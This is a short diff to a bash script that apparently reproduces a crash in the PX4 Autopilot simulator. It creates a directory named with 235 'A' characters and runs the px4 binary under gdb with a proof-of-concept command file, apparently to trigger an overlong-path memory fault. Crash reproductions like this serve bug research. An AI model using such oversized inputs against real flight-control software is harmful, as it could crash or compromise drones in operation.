@@ -1,4 +1,9 @@
 #!/bin/bash
-/PX4-Autopilot/build/px4_sitl_default/bin/px4 /out
+mkdir tmp
+cd tmp
+mkdir `perl -e 'print"A"x235'`
+mkdir z
+cd ..
+gdb --batch --command=/poc.gdb --args ./build/px4_sitl_default/bin/px4
 /bin/bash
 
